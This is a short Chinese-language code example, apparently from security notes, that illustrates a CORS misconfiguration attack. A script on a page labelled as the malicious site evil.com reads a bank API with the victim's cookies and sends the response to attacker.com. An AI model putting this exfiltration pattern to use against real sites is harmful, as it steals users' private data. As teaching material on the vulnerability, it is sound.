# CORS漏洞
```
<!-- 恶意网站 evil.com -->
<script>
fetch('https://bank.com/api/userdata', {
  credentials: 'include' // 携带用户Cookie
})
.then(response => response.json())
.then(data => {
  // 将数据发送到攻击者服务器
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>
```